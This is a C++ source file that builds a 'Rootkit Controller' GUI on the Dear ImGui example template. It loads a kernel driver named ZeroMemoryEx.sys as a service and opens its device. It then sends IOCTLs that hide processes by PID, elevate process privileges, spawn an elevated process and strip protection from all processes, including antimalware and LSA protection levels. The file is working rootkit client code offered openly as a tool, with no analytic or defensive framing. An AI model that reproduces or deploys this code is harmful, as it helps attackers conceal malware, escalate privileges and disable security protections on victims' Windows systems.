// Dear ImGui: standalone example application for GLFW + OpenGL 3, using programmable pipeline
// (GLFW is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan/Metal graphics context creation, etc.)
// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.
// Read online: https://github.com/ocornut/imgui/tree/master/docs
#define STB_IMAGE_IMPLEMENTATION
#define IMGUI_DEFINE_MATH_OPERATORS
#include "stb_image.h"
#include <string.h>

#include "imgui.h"
#include "imgui_impl_opengl3.h"
#include "imgui_impl_glfw.h"

#include "imgui.cpp"
#include "imgui_demo.cpp"
#include "imgui_draw.cpp"
#include "imgui_tables.cpp"
#include "imgui_widgets.cpp"
#include "imgui_impl_opengl3.cpp"
#include "imgui_impl_glfw.cpp"
#include "components.h"
#include <stdio.h>
#include <Windows.h>
#include <winioctl.h>
#define GL_SILENCE_DEPRECATION
#if defined(IMGUI_IMPL_OPENGL_ES2)
#include <GLES2/gl2.h>
#endif



// [Win32] Our example includes a copy of glfw3.lib pre-compiled with VS2010 to maximize ease of testing and compatibility with old VS compilers.
// To link with VS2010-era libraries, VS2015+ requires linking with legacy_stdio_definitions.lib, which we do using this pragma.
// Your own project should not be affected, as you are likely to link with a newer binary of GLFW that is adequate for your version of Visual Studio.
#if defined(_MSC_VER) && (_MSC_VER >= 1900) && !defined(IMGUI_DISABLE_WIN32_FUNCTIONS)
#pragma comment(lib, "legacy_stdio_definitions")
#endif

// This example can also compile and run with Emscripten! See 'Makefile.emscripten' for details.
#ifdef __EMSCRIPTEN__
#include "../libs/emscripten/emscripten_mainloop_stub.h"
#endif


static void glfw_error_callback(int error, const char* description)
{
    fprintf(stderr, "GLFW Error %d: %s\n", error, description);
}

struct	Texture
{
    GLuint id;
    int height;
    int width;
};


Texture	readTextureFile()
{
    Texture	result = {};

    // decompress the image from the buffer
    int	channels = 0;

    void* buffer = stbi_load_from_memory((const stbi_uc*)rawData, sizeof(rawData), &(result.width), &(result.height), &channels, 4);
    // create gltexture and upload it to the gpu
    glGenTextures(1, &(result.id));
    glBindTexture(GL_TEXTURE_2D, result.id);

    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);

    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, result.width, result.height, 0, GL_RGBA, GL_UNSIGNED_BYTE, buffer);
    
    stbi_image_free(buffer);

    return (result);
}


#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN,0x45,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PRIVILEGE_ELEVATION CTL_CODE(FILE_DEVICE_UNKNOWN,0x90,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_SYSTEM CTL_CODE(FILE_DEVICE_UNKNOWN,0x91,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINTCB CTL_CODE(FILE_DEVICE_UNKNOWN,0x92,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINDOWS CTL_CODE(FILE_DEVICE_UNKNOWN,0x93,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_AUTHENTICODE CTL_CODE(FILE_DEVICE_UNKNOWN,0x94,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINTCB_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x95,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_WINDOWS_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x96,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_LSA_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x97,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x98,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x99,METHOD_BUFFERED ,FILE_ANY_ACCESS)

#define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)

BOOL loadDriver(char* driverPath) {
    SC_HANDLE hSCM, hService;

    // Open a handle to the SCM database
    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL)
        return (1);
    const char* g_serviceName = "ZeroMemoryEx";

    // Check if the service already exists
    hService = OpenServiceA(hSCM, g_serviceName, SERVICE_ALL_ACCESS);
    if (hService != NULL) {
        printf("Service already exists.\n");

        // Start the service if it"s not running
        SERVICE_STATUS serviceStatus;
        if (!QueryServiceStatus(hService, &serviceStatus)) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return (1);
        }

        if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {
            if (!StartServiceA(hService, 0, nullptr)) {
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                return (1);
            }

            printf("Starting service...\n");
        }

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (0);
    }

    // Create the service
    hService = CreateServiceA(hSCM, g_serviceName, g_serviceName, SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL,
        NULL, NULL);

    if (hService == NULL) {
        CloseServiceHandle(hSCM);
        return (1);
    }

    printf("Service created successfully.\n");

    // Start the service
    if (!StartServiceA(hService, 0, nullptr)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return (1);
    }

    printf("Starting service...\n");

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return (0);
}

// Main code
int main(int, char**)
{
    glfwSetErrorCallback(glfw_error_callback);
    if (!glfwInit())
        return 1;

    // Decide GL+GLSL versions
#if defined(IMGUI_IMPL_OPENGL_ES2)
    // GL ES 2.0 + GLSL 100
    const char* glsl_version = "#version 100";
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 2);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);
    glfwWindowHint(GLFW_CLIENT_API, GLFW_OPENGL_ES_API);
#elif defined(__APPLE__)
    // GL 3.2 + GLSL 150
    const char* glsl_version = "#version 150";
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 2);
    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);  // 3.2+ only
    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);            // Required on Mac
#else
    // GL 3.0 + GLSL 130
    const char* glsl_version = "#version 130";
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);
    //glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);  // 3.2+ only
    //glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);            // 3.0+ only
#endif


  

    GLFWwindow* window = glfwCreateWindow(1280, 720, "Dear ImGui GLFW+OpenGL3 ", nullptr, nullptr);
    if (window == nullptr)
        return 1;
    glfwMakeContextCurrent(window);
    glfwSwapInterval(1); // Enable vsync

    // Setup Dear ImGui context
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls

    // Setup Dear ImGui style
    ImGui::StyleColorsDark();
    //ImGui::StyleColorsLight();

    // Setup Platform/Renderer backends
    ImGui_ImplGlfw_InitForOpenGL(window, true);
    ImGui_ImplOpenGL3_Init(glsl_version);

    // Load Fonts
    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.
    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.
    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).
    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.
    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.
    // - Read 'docs/FONTS.md' for more instructions and details.
    // - Remember that in C/C++ if you want to include a backslash \ in a string literal you need to write a double backslash \\ !
    // - Our Emscripten build process allows embedding fonts to be accessible at runtime from the "fonts/" folder. See Makefile.emscripten for details.
    //io.Fonts->AddFontDefault();
    //io.Fonts->AddFontFromFileTTF("c:\\Windows\\Fonts\\segoeui.ttf", 18.0f);
    //io.Fonts->AddFontFromFileTTF("../../misc/fonts/DroidSans.ttf", 16.0f);
    //io.Fonts->AddFontFromFileTTF("../../misc/fonts/Roboto-Medium.ttf", 16.0f);
    //io.Fonts->AddFontFromFileTTF("../../misc/fonts/Cousine-Regular.ttf", 15.0f);
    //ImFont* font = io.Fonts->AddFontFromFileTTF("c:\\Windows\\Fonts\\ArialUni.ttf", 18.0f, nullptr, io.Fonts->GetGlyphRangesJapanese());
    //IM_ASSERT(font != nullptr);

    // Our state
    char buf[120] = { 0 };

    bool show_demo_window = false;
    bool connect_to_rootkit = false;
    bool elev_specific_process = false;
    bool is_rootket_connected = false;
    bool unprotect_all_processes = false;
    bool hide_specific_process = false;
    bool spawn_elevated_process = false;
    HANDLE hdevice = NULL;
    int currentPid = GetCurrentProcessId();
    bool HideProcess_Window = false;
    int component_color_handler = 0;
    int lpBytesReturned = 0;
    bool all_windows = false;
    int pid = 0;
    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);

    // Main loop
#ifdef __EMSCRIPTEN__
    // For an Emscripten build we are disabling file-system access, so let's not attempt to do a fopen() of the imgui.ini file.
    // You may manually call LoadIniSettingsFromMemory() to load settings from your own storage.
    io.IniFilename = nullptr;
    EMSCRIPTEN_MAINLOOP_BEGIN
#else
    while (!glfwWindowShouldClose(window))

#endif
    {

        // - When io.WantCaptureKeyboard is true, do not dispatch keyboard input data to your main application, or clear/overwrite your copy of the keyboard data.
        // Generally you may always pass all inputs to dear imgui, and hide them from your application based on those two flags.
        glfwPollEvents();

        // Start the Dear ImGui frame

        float alive_rootkit[100];
        for (int n = 0; n < 100; n++)
            alive_rootkit[n] = sinf(n * 0.2f + ImGui::GetTime() * 1.5f);
       
        //
        ImGui_ImplOpenGL3_NewFrame();
        ImGui_ImplGlfw_NewFrame();
        ImGui::NewFrame();
        Texture	tex = readTextureFile();
        // 1. Show the big demo window (Most of the sample code is in ImGui::ShowDemoWindow()! You can browse its code to learn more about Dear ImGui!).
        if (show_demo_window)
            ImGui::ShowDemoWindow(&show_demo_window);
        {
            static float f = 0.0f;
            static int counter = 0;

            ImGui::Begin("Rootkit Controller!");                          // Create a window called "Hello, world!" and append into it.
            ImVec2 windowSize = ImGui::GetWindowSize();

            // Calculate the position to center the image
            float imageWidth = 180.0f;
            float imageHeight = 180.0f;
            float imageX = (windowSize.x - imageWidth) * 0.5f;

            // Set the cursor position to center the image
            ImGui::SetCursorPosX(imageX);



            // Display the image
            ImGui::Image((void*)(intptr_t)tex.id, ImVec2(imageWidth, imageHeight));
            if (ImGui::Button("Connect to rootkit"))      // Edit bools storing our window open/close state
            {   
                WIN32_FIND_DATAA fileData;
                HANDLE hFind;
                char FullDriverPath[MAX_PATH];
                BOOL once = 1;

                hFind = FindFirstFileA("ZeroMemoryEx.sys", &fileData);

                if (hFind != INVALID_HANDLE_VALUE) {  // file is found
                    if (GetFullPathNameA(fileData.cFileName, MAX_PATH, FullDriverPath, NULL) !=
                        0) {  // full path is found
                    }
                    else {
                        is_rootket_connected = 0;
                        
                    }
                }
                else {
                }

                if (loadDriver(FullDriverPath)) {
                    is_rootket_connected = 0;
                }


                hdevice = CreateFile(L"\\\\.\\KDChaos", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

                if (hdevice == INVALID_HANDLE_VALUE)
                {
                    is_rootket_connected = 0;
                }
                else
                {
                    is_rootket_connected = 1;
                }
            }

            ImGui::SameLine();
            if (is_rootket_connected)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green

                ImGui::Text("Rootkit Connected");               // Display some text (you can use a format strings too)
                ImGui::PlotLines(".", alive_rootkit, 100);

                ImGui::PopStyleColor(); // Restore the default text color                

            }
            else
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red

                // Display text with the changed color

                ImGui::Text("Rootkit not Connected");               // Display some text (you can use a format strings too)
               // ImGui::PlotLines(".", dead_rootkit, 100);

                ImGui::PopStyleColor(); // Restore the default text color                

            }

            ImGui::Checkbox("Demo Window", &show_demo_window);      // Edit bools storing our window open/close state
            ImGui::Checkbox("Hide Process", &hide_specific_process);
            ImGui::Checkbox("Spawn Elevated Process", &spawn_elevated_process);
            ImGui::Checkbox("Elevated Specific Process", &elev_specific_process);
            ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);

            ImGui::SliderFloat("float", &f, 0.0f, 1.0f);            // Edit 1 float using a slider from 0.0f to 1.0f
            ImGui::ColorEdit3("clear color", (float*)&clear_color); // Edit 3 floats representing a colo


            if (ImGui::Button("Button"))                            // Buttons return true when clicked (most widgets return true when edited/activated)
                counter++;
            ImGui::SameLine();
            ImGui::Text("counter = %d", counter);

            ImGui::Text("Application average %.3f ms/frame (%.1f FPS)", 1000.0f / io.Framerate, io.Framerate);

            ImGui::End();
        }



        if (elev_specific_process)
        {
            ImGui::Begin("Another Window", &elev_specific_process);   // Pass a pointer to our bool variable (the window will have a closing button that will clear the bool when clicked)
            ImGui::Text("Enter PID");

            ImGui::SameLine();

            ImGui::InputText(".", buf, IM_ARRAYSIZE(buf));

            if (ImGui::Button("Elevate Porcess"))
            {
                pid = atoi(buf);
                if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
                {
                    component_color_handler = 2;
                }
                else
                {
                    component_color_handler = 1;
                }
            }

            if (component_color_handler == 1)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red

                ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
            }
            if (component_color_handler == 2)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green
                ImGui::Text("IOCTL sent, Process now is elevated");

            }

            if (component_color_handler)
                ImGui::PopStyleColor(); // Restore the default text color

            ImGui::End();
        }
        // 3. Show another simple window.
        if (hide_specific_process)
        {
            ImGui::Begin("Another Window", &hide_specific_process);   // Pass a pointer to our bool variable (the window will have a closing button that will clear the bool when clicked)
            ImGui::Text("Enter PID");

            ImGui::SameLine();

            ImGui::InputText(".", buf, IM_ARRAYSIZE(buf));

            if (ImGui::Button("Hide Porcess"))
            {
                pid = atoi(buf);
                if (DeviceIoControl(hdevice, HIDE_PROC, (LPVOID)&pid, sizeof(pid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
                {
                    component_color_handler = 2;
                }
                else
                {
                    component_color_handler = 1;
                }
            }

            if (component_color_handler == 1)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red

                ImGui::Text("Faild to send IOCTL, Please make sure to provide a valid pid.");
            }
            if (component_color_handler == 2)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green
                ImGui::Text("IOCTL sent, Process now is hidden");

            }

            if (component_color_handler)
                ImGui::PopStyleColor(); // Restore the default text color

            ImGui::End();
        }

        if (unprotect_all_processes)
        {

            ImGui::Begin("UNPROTECT_ALL_PROCESSES", &unprotect_all_processes);   // Pass a pointer to our bool variable (the window will have a closing button that will clear the bool when clicked)


            if (ImGui::Button("UNPROTECT ALL PROCESSES"))
            {
                if (DeviceIoControl(hdevice, UNPROTECT_ALL_PROCESSES, NULL, NULL, NULL, 0, 0, NULL))
                {
                    component_color_handler = 2;
                }
                else
                {
                    component_color_handler = 1;
                }

            }

            if (component_color_handler == 1)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red

                ImGui::Text("Failed to send the IOCTL.");


            }

            if (component_color_handler == 2 || component_color_handler == 3)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green

                ImGui::Text("all processes protection has been removed !!");

            }

            if (component_color_handler)
                ImGui::PopStyleColor(); // Restore the default text color                

            ImGui::End();
        }
        
        if (spawn_elevated_process)
        {

            ImGui::Begin("spawA elevated_process", &spawn_elevated_process);   // Pass a pointer to our bool variable (the window will have a closing button that will clear the bool when clicked)


            if (ImGui::Button("spawn_elevated_process"))
            {
                if (DeviceIoControl(hdevice, PRIVILEGE_ELEVATION, (LPVOID)&currentPid, sizeof(currentPid), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
                {
                    component_color_handler = 2;
                    if (!lpBytesReturned)
                    {
                        component_color_handler = 3;
                    }

                }
                else
                {
                    component_color_handler = 1;
                }


            }

            if (component_color_handler == 1)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f)); // Set text color to red

                ImGui::Text("Failed to send the IOCTL.");

            }
            if (component_color_handler == 2 || component_color_handler == 3)
            {
                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f)); // Set text color to green

                if (component_color_handler == 3)
                {

                    ImGui::Text("The privilege of process %d has been elevated.");

                }
                else {
                    ImGui::Text("IOCTL %x sent!");

                }
            }

            if (component_color_handler)
                ImGui::PopStyleColor(); // Restore the default text color                

            ImGui::End();
        }
        // Rendering
        ImGui::Render();
        int display_w, display_h;
        glfwGetFramebufferSize(window, &display_w, &display_h);
        glViewport(0, 0, display_w, display_h);
        glClearColor(clear_color.x * clear_color.w, clear_color.y * clear_color.w, clear_color.z * clear_color.w, clear_color.w);
        glClear(GL_COLOR_BUFFER_BIT);
        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());

        glfwSwapBuffers(window);
    }
#ifdef __EMSCRIPTEN__
    EMSCRIPTEN_MAINLOOP_END;
#endif

    // Cleanup
    ImGui_ImplOpenGL3_Shutdown();
    ImGui_ImplGlfw_Shutdown();
    ImGui::DestroyContext();

    glfwDestroyWindow(window);
    glfwTerminate();

    return 0;
}
